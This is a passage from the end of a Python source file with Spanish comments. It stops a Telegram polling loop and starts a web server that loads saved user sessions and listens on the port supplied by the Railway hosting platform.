def stop_telegram_polling():
    """Detiene el polling de Telegram."""
    global telegram_polling_active
    
    if telegram_polling_active:
        telegram_polling_active = False
        logger.info("🛑 Solicitud para detener polling de Telegram recibida")
        return True
    return False


if __name__ == '__main__':
    # Cargar sesiones previas
    global_user_sessions = load_sessions_from_file()
    
    # NUEVO: Iniciar polling automáticamente pero solo una vez al inicio
    start_telegram_polling()
    logger.info("🚀 Servidor iniciado con polling de Telegram activo")
    
    # Usar el puerto que proporciona Railway
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)